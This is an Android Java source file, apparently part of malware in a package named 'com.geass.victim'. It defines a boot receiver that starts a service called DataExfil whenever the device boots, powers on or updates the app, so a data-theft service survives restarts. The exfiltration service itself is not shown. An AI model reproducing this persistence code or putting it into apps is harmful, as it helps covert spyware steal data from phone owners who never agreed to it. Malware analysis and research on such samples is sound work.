package com.geass.victim;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class CommandReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
                    Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
                    "android.intent.action.QUICKBOOT_POWERON".equals(action)) {

                Intent serviceIntent = new Intent(context, DataExfil.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
            }
        }
    }
}